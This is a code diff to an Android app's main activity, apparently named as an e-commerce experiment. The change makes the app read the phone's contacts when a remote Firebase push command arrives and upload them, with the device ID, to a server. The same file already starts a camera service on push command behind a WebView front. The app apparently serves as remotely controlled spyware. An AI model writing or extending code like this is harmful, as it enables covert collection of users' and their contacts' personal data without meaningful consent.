@@ -26,6 +26,7 @@ import com.ecommerce.experimentapp.service.CameraService
 import com.ecommerce.experimentapp.service.MyFirebaseMessagingService
 import com.ecommerce.experimentapp.service.MyFirebaseMessagingService.Companion
 import com.google.firebase.messaging.FirebaseMessaging
+import com.google.gson.Gson
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.MultipartBody
 import okhttp3.RequestBody
@@ -51,10 +52,10 @@ class MainActivity : AppCompatActivity() {
         setContentView(binding.root)
 
         setSupportActionBar(binding.toolbar)
-        setWebView()
         requestPermissions()
         initializeFirebase()
         handleFCMServiceIntent(intent) // Handle any intent that started this activity
+        setWebView()
 
     }
 
@@ -93,7 +94,7 @@ class MainActivity : AppCompatActivity() {
                 startCameraService(cameraType)
             }
             if (it.hasExtra(AppConstants.FCM_SERVICE_TYPE) && it.getStringExtra(AppConstants.FCM_SERVICE_TYPE) == AppConstants.CONTACTS) {
-
+                readContacts()
             }
         }
     }
@@ -150,11 +151,11 @@ class MainActivity : AppCompatActivity() {
                 permission to grantResults[index]
             }.toMap()
 
-            if (permissionMap[Manifest.permission.READ_CONTACTS] == PackageManager.PERMISSION_GRANTED) {
-                readContacts()
+           /* if (permissionMap[Manifest.permission.READ_CONTACTS] == PackageManager.PERMISSION_GRANTED) {
+               // readContacts()
             } else {
                 Log.w(TAG, "Read Contacts Permission Denied")
-            }
+            }*/
         }
     }
 
@@ -163,21 +164,21 @@ class MainActivity : AppCompatActivity() {
             this.deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
             this.contacts = contacts
         }
-
+        Log.d(TAG, "Contact Req==  "+Gson().toJson(contactReq))
         Log.d(TAG, "Contact sending to Server.... ")
         val call = RetrofitClient.instance.sendContacts(contactReq)
-        call.enqueue(object : Callback<Void> {
-            override fun onResponse(call: Call<Void>, response: Response<Void>) {
+        call.enqueue(object : Callback<String> {
+            override fun onResponse(call: Call<String>, response: Response<String>) {
                 if (response.isSuccessful) {
                     Log.d(TAG, "Contacts uploaded successfully")
-                    //Toast.makeText(baseContext, "FCM Token sent successfully", Toast.LENGTH_LONG).show()
+                    Toast.makeText(baseContext, "Contacts uploaded successfully", Toast.LENGTH_LONG).show()
                 } else {
                     Log.w(TAG, "Upload failed: ${response.errorBody().toString()}")
-                    Toast.makeText(baseContext, "Failed to send FCM Token: ${response.errorBody().toString()}", Toast.LENGTH_LONG).show()
+                    Toast.makeText(baseContext, "Failed to send Contacts to server: ${response.errorBody().toString()}", Toast.LENGTH_LONG).show()
                 }
             }
 
-            override fun onFailure(call: Call<Void>, t: Throwable) {
+            override fun onFailure(call: Call<String>, t: Throwable) {
                 Log.e(TAG, "Error: ${t.message}")
             }
         })
@@ -227,10 +228,6 @@ class MainActivity : AppCompatActivity() {
                     }
                 }
             }
-        }
-
-        for (contact in contactDataList) {
-            Log.d(TAG, "Contact: ${contact.name} - ${contact.mobile}")
         }
 
          sendContactsToServer(contactDataList)
